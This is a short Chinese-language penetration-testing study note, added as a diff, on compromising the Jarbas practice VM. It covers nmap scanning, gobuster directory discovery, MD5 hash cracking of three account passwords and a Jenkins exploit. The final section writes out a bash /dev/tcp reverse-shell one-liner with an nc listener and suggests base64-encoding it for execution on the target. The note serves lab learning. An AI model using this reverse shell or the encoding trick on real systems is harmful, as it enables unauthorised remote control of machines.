@@ -1,0 +1,30 @@
+渗透测试流程复习与靶机准备（jarbas）
+
+ip a      查看本地ip网段   192.168.119.0/24       
+
+确保和靶机在同一网段，nmap扫描网段，识别出靶机ip
+
+nmap -sn 192.168.119.0/24
+
+sudo namp -sS -sV -p- -O -T4 192.168.119.141 
+
+
+ 探测到靶机开放了80/http，22/ssh，3306/mysql 端口
+
+mysql不允许远程连接
+访问网页端
+gobuster扫描目录：
+gobuster dir -u http://192.168.119.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+找到index.html，access.html
+拼接访问access.html
+hash-identifier ''识别为MD5加密
+找到三个账户，三个md5加密的密码
+解密后尝试登录
+
+利用jenkins漏洞反弹shell
+bash  -i >& /dev/tcp/192.168.119.129/4444 0>&1         bash -i:启动交互式bash 
+/dev/tcp/:linux伪设备，建立tcp连接  0>&1:将标准输入（键盘输入）也重定向到该连接
+tips:还可以在本对命令进行base64加密，在靶机执行解码并运行，以适应不同场景
+nc -lvnp 4444
+
+
